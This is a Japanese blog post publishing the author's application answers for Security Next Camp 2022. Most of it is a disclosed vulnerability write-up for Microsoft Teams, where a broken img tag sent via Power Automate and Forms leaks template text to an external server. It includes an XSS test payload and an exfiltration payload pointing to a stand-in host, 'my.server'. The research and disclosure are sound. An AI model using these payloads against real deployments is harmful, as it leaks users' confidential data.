# セキュリティ・ネクストキャンプ2022の応募課題なるもの

## 応募にあたって
はじめまして、
セキュリティ・ネクストキャンプ2022受講者の[Satoki](https://twitter.com/satoki00)です。
普段は大学院生として研究をしながら、某セキュリティ企業で脆弱性を見つけるお手伝いをしています。
キャンプには応募課題晒しなるものがあるようで、読み物にも来年度の応募の参考にもならない文章ですがあげておきます。
応募課題の自分の中のテーマとしては「**講師陣に読んでもらうので、落ちても何か面白さを感じてほしい**」でした。
締め切りの一時間ほど前だったので、たまたま手元にあった公開許可をもらった0dayを検証しつつ殴り書きました。
その他の部分はお察しです(ぼくのかんがえたさいきょうのじこあぴーるです)。

![000097195.png](images/000097195.png)  
[【セキュリティ・ネクストキャンプ2022 オンライン　ホーム：IPA 独立行政法人 情報処理推進機構】](https://www.ipa.go.jp/jinzai/camp/2022/next2022_index.html) より引用  

全国大会はおじさん過ぎたので、年齢制限で応募できませんでした…。

## 2022年度 セキュリティ・ネクストキャンプ 応募課題

以下について，フリーフォーマットで自由に記述し回答してください．

■ あなたに関する問い
あなたは今までどのようなことをやってきましたか．どのようなことができて，どのようなことが得意で，どのようなことに自信がありますか．
どのようなものを作りましたか．どのような情報を発信してきましたか．
どのようにしてそうしたことをやってきましたか．なぜ，そのようなことをやってきましたか．やってきてどう思いましたか．
参加できた場合，セキュリティ・ネクストキャンプにどのようなことを期待し，どのようなことをやってみたいですか．

--------------------------------------------------

私は現在まで、CTFやBugBountyを通じて様々なWebサービスやソフトウェアの0day脆弱性を発見してきました。
CTFではSECCON beginners CTF、IMCTF、TsukuCTF、WEST-SEC CTFなどの作問を担当し、その過程で確認した未確認な挙動を実際に悪用可能であるか検証しました。
結果として、Google PlayなどにおけるXSSの発見、サイボウズ関連製品における8件の未公開脆弱性(他者との重複含む)の発見、複数のOSSにおけるCVE獲得などを達成しました。
また、SecHack365や所属大学などで実世界のプライバシー保護に焦点を当てた研究を行い、盲点となっていた分野の新たなセキュリティリスクを明らかにしました。
「仮想背景を使用したリモート会議映像における秘匿された背景の再構築手法」や「Androidアプリの自動リンクにおける悪意のあるリンク生成リスクの検討」などがその成果です。
これらのことから、実務分野、研究分野ともに日常の些細な違和感からその背後に隠れたセキュリティリスクを新たに見出すことが得意といえ、その核となる新たなひらめきを得ることに自信を感じています。

研究分野に関連し、バーチャル背景が適用された動画から部屋の背景画像を復元するOSSであるRoomgを開発し、セキュリティカンファレンスAVTOKYOなどで広く一般に情報発信を行ってきました。
技術ブログやWriteupなどでも、オフェンシブなセキュリティリスクに関連した情報を蓄積しています。
これは自身の考えをまとめる目的も兼ねていますが、新たにセキュリティ分野に興味を持った方々がより効率的に情報を身に着けられるような知の道路整備を意識しています。
目を引くタイトルを用いた記事などでは、普段セキュリティ分野に興味のない方にも身近に感じてもらえるよう工夫しています。
これは自身の体験によるものですが、セキュリティ分野に知見がない幼き頃に今は休刊してしまった「HackerJapan」を読んだ時と同じような興奮を少しでも味わっていただければと期待しているものでもあります。
このような情報発信の中で、共通の分野に興味を持つチームなどが結成されCTFやBugBountyに参加する機会を得ました。
集まりの中では互いに情報発信が行われており、より深く学べる環境で自分自身に無かった知識を新たに吸収することができています。
情報発信は向上心のある仲間を集め、自身の知識レベル向上につなげる正のフィードバックを呼び込む手法であると改めて感じています。

セキュリティ・ネクストキャンプでは自身が好んでいる分野以外の講義が多くあります。
自身の得意とする、セキュリティリスクを新たに見出すひらめきが他の分野にも利用できるか試すとともに、そのひらめきを得るために必要である前提知識を広く吸収できることを期待します。
また、ネクストキャンプで得たつながりの中で相互に情報を発信し、高めあう関係性を構築することも期待しています。

■ 課題への姿勢に関する問い
自身で何らかの技術的な疑問を設定し，その疑問を解決しようと取り組み，その過程を示すことで，自身の技術力や課題に取り組むやりかたを説明してください．
(疑問の例：実行ファイルはどのような構造になっているのだろう？ lsコマンドは何をしているのだろう？ pingコマンドを実行すると何が起きるんだろう？ といったようなことです)
設定する疑問は何でも構いませんし，解決しなくても構いません．
解決できたかどうかではなく，いかに課題に取り組むかという点を評価します．

--------------------------------------------------

技術的な疑問：【Microsoft製品(サービス)に未発見の脆弱性があるだろうか？】

題として広く一般に使われている「Microsoft製品(サービス)」を対象とし、未発見の脆弱性(0day)があるかどうかの疑問を解決します。
注意点として、BugBountyプログラムが行われていることの確認、他者に影響の及ばない範囲での実施が求められます。

まず、Microsoft製品(サービス)といっても広く、OSからSaaSまでを網羅しています。
この中から脆弱性を発見する対象を選ばなければなりません。
今回は広く使われており、自身のデスクトップに起動しているMicrosoft Temasを選択することとします。
選択は適当でもよいのですが、他のアプリケーションと連携しているサービスのほうがロジックバグを見つけやすくなります。
Web版の提供もあり、自身がWeb系統の脆弱性の知識を持っていることも理由の一つです。
これらのことを総合して、Microsoft TemasのWeb系統の他のアプリケーションとの連携を狙っていく方針とします。
対象の選定が終わり次第、Microsoft Temasのサービス形態を調査します。
どのようなクライアントがあり、それらはどのような機能を提供しているのかを調査します。
クライアントに関して、Windows、Linux、iOS、Androidなどへの提供が公式ページより読み取れます。
これら各OSごとへの完全な個別実装が存在する場合、それらの差をついた脆弱性などが発生し得ます(自身の研究「Androidアプリの自動リンクにおける悪意のあるリンク生成リスクの検討」はその例の一つです)がソフトウェアをリバースエンジニアリングして解析する必要があり、時間がかかります。
今回はWeb版の提供もあるため、共通するWeb部分の実装がすべてのクライアントに含まれていると予想できます。
このWeb部分に脆弱性が入り込む余地はないでしょうか？
簡単な例を挙げると、サニタイズの不備や混合コンテンツなどでのクライアントサイドの攻撃や中間者攻撃などです。
Microsoft Temasはチャット機能が実装されているためHTMLタグのバイパスなどの可能性が高そうです。
実際にチームを作成し、以下のようなXSSペイロードをチャット欄で自分自身に向けて送信してみます。
```html
<img src=x onerror=alert(1);>
```
alertが発火せず、imgタグも有効でないため、通常のチャットではサニタイズされ文字列として表示されているようです。
次に、このサニタイズが送信時にフロントエンドで行われているのか、サーバサイドで行われているのか、Local Proxyを利用してリクエストをキャプチャします。
確認だけであれば開発者ツールからも可能ですが、書き換えを行いたいためBurp Suiteなどを利用します。
以下のデータがキャプチャできました(重要部分のみ抜粋)。
```json
{
   "content":"<div><div class=\"copy-paste-block\" itemprop=\"copy-paste-block\">\n<div style=\"font-size:14px;\">\n<div><span>&lt;img src=x onerror=alert(1);&gt;</span></div>\n</div>\n</div>\n</div>",
   "messagetype":"RichText/Html",
   "contenttype":"text",
略
}
```
`&lt;`などが確認できるため、クライアントサイドでサニタイズされたデータが送信されているようです。
そこで、サニタイズを元に戻したデータに書き換え送信してみますが、同じ結果となります。
サーバサイドでもサニタイズが行われているようです。
しかしMicrosoft Temasに画像送信機能がないわけではありません。
ユーザからの入力のみを危険だと判断して、サニタイズを行っている可能性があります。
それでは、ほかの連携アプリからのデータはどうでしょうか？
連携されている他Microsoft製品からのデータは信用しており、サニタイズが行われていない可能性があります。
Microsoftのアプリ間の連携にはMicrosoft Power Automateが利用できます。
ここでは効率的に文字列データをMicrosoft Temasに渡したいため、Microsoft Formsと連携します。
Microsoft Power Automateではひな形となるテンプレートの中にMicrosoft Formsから送信されたtextを埋め込んでMicrosoft Temasへ送信する一連の流れを作ります。
Microsoft Power Automateのテンプレートは以下のように設定します(`[Forms Text]`にFormsからのtextが挿入されます)。
```text
[Forms Text]を受信しました。
```
それではMicrosoft FormsからMicrosoft Power Automateを経由してMicrosoft Temasに先ほどのXSSペイロードを送信してみます。
すると、Microsoft Power Automateに設定した、テンプレートのテキスト「`を受信しました。`」の直前に壊れた画像が表示されています。
受信したメッセージのソースは以下のようです(重要部分のみ抜粋)。  
```html
略
<img class="ts-image loading" target-src="undefined" lazy-load="true" data-tid="messageBodyImageSrc" src="undefined" width="250" height="250">
略
を受信しました。
```
Microsoft Forms由来のテキストがimgタグと認識されてしまっています。
ただし、イベントハンドラや不正なsrcは削除されているようです。
つまりイベントハンドラ削除など多段階のセキュリティ機構がサーバサイドで行われているようです。
これで打つ手がないでしょうか？
試しに、以下のような壊れたimgタグを送信してみます。
```html
<img src=http://example.com?
```
ソースは以下のようです(重要部分のみ抜粋)。
```html
<img class="ts-image loading" target-src="https://jp-prod.asyncgw.teams.microsoft.com/urlp/v1/url/content?url=http%3a%2f%2fexample.com%3f%e3%82%92%e5%8f%97%e4%bf%a1%e3%81%97%e3%81%be%e3%81%97%e3%81%9f%e3%80%82%3c%2fp" lazy-load="true" data-tid="messageBodyImageSrc" src="https://jp-prod.asyncgw.teams.microsoft.com/urlp/v1/url/content?url=http%3a%2f%2fexample.com%3f%e3%82%92%e5%8f%97%e4%bf%a1%e3%81%97%e3%81%be%e3%81%97%e3%81%9f%e3%80%82%3c%2fp" width="250" height="250">
```
先ほどと打って変わってsrcにURLが見られます。
パーセントエンコーディングをデコードすると以下のようでした。  
```text
デコード前：http%3a%2f%2fexample.com%3f%e3%82%92%e5%8f%97%e4%bf%a1%e3%81%97%e3%81%be%e3%81%97%e3%81%9f%e3%80%82%3c%2fp
デコード後：http://example.com?を受信しました。</p
```
Microsoft Power Automateに設定したテンプレートのテキストがURLとして認識されてしまっています。
このようにして不完全なimgタグでのバグを発見しました。
これは脆弱性に発展しないのでしょうか？
ここでimgタグのURLとして、自身のサーバを指定するとクエリとして「`を受信しました。</p`」が取得できることに気づきます。
もしこの部分に重要な文字列が含まれていたら、imgのsrcに重要な文字列を含んだURLを埋め込めることになります。
運用では重要な文字列として担当者名や連絡先アドレスなどが書かれているケースが想定できます。
また、imgタグはMicrosoft Temas内で閲覧できる形で埋め込まれています。
つまりユーザがこのimgタグを読み込んだ時点で、Microsoft Power Automateに設定したテンプレートのテキストの一部がリークされます。
実際にMicrosoft Power Automateのテンプレートを以下のように設定し、試してみます。
```text
[Forms Text]Secret_Text_123456789
```
ペイロードは自身のサーバを`my.server`とし、以下になります。
```html
<img src=http://my.server?
```
結果として次のようなリクエストを受け取りました(重要部分のみ抜粋)。
```text
Headers
host: my.server
user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5 skype-url-preview@microsoft.com
accept-language: en-US
accept-encoding: gzip, deflate
Query
Secret_Text_123456789</p
```
MicrosoftのBotが画像を確認するため、先にクロールしに来たようです。
この挙動は情報流出の脆弱性といえるでしょう。
さらに、このリスクのほかに閲覧したタイミングの把握や、画像キャッシュの有無などXS-Leaksなどの手法に転用できることがわかります。


このようにして、「Microsoft製品(サービス)に未発見の脆弱性があるだろうか？」という疑問に、実際に脆弱性を見つけることで答えを出すことができたといえます。
最後に、本情報はMicrosoftからの公開許可を得ています。


■ 興味ある分野に関する問い
セキュリティ・ネクストキャンプの講義の一覧を見て，その中から興味のある講義を選び，その講義で扱うテーマに対して自分が考えること，興味，疑問，課題，自分なりの考察などを説明してください．
その分野について知識があるかどうかではなく，いかに興味や疑問を持ち，課題を考え，自分なりに調べて考察するかといった点を評価します．

--------------------------------------------------

興味のある講義：【プログラミング言語を自作しよう -クジラ飛行机-】

日本語プログラミング言語「なでしこ」は自身が初めてプログラミングを行う際に使用した言語です。
弟の誕生日を祝うプログラムでしたが、完成した際の達成感を今でも覚えています(文法などはほとんど忘れていますが)。
CTFの問題として出題したこともあります。
https://github.com/satoki/imwsctf_2022_satoki_writeups/tree/master/misc/nakonako

プログラミング言語の自作本や資料などはネット上にありふれており、車輪の再開発としての面白みはあるものの、自己で触れようと思い立つことが少ないと感じています。
実際にプログラミング言語の開発を行っているペンテスターや脆弱性診断士は少ないという肌感覚もあります。
一方今回の講義ではプログラミング言語の開発に加えて、日本語で記述できるといった普段とは違う面白さが感じられます。
私自身、日本語を日常で利用していますがプログラミング言語との親和性が高いとは思えません。
この日本語とプログラミング言語を合わせるアイデアのもととなった考え方に大変興味があります。
また、技術的興味としては日本語との接続部分にあります。
「なでしこ」では日本語としての特性上、「それ」など指示語を設定する必要があります。
日本語らしさを失うことなく、プログラミング言語として完成させるためには、指示語の省略などを行う必要があるとされます。
この省略へのアプローチの実装や、日本語らしさの評価観点にも興味を持っています。
さらに、「なでしこ」は令和3年の技術の教科書(中3)に採用されるなど一般に教育向けに使われており、他の言語よりも日本人に理解されやすいと感じています。
自身の経験も交えると「なでしこ」からPythonなどへの移行は比較的容易く感じた記憶があります。
一方、コンピュータ内部のメモリ管理やネットワークプロトコルの設定/管理を命令一つで行えてしまえます。
例えば
```
サーバーとはＴＣＰサーバー
サーバーのポートは5678
サーバーを開始
```
でサーバが立ち上がります。
入門においては低レイヤの知識は不要になりますが、ITの道に進む教育という観点においてより下のレイヤを意識していく機構は必須であると感じます。
下のレイヤへのパスが「なでしこ」から見えず、再度C言語やアーキテクチャなどを学び直しす際の経験としての「なでしこ」から、よりコンピュータの内部の仕組みを学べる「なでしこ」への発展が期待されます。

■ その他に関する問い
その他，アピールしたい点などあれば自由記述で回答してください．

--------------------------------------------------
質問はありません。
アピールしたい点としては、私の初CVEは講師のクジラ飛行机さんのアプリケーションです。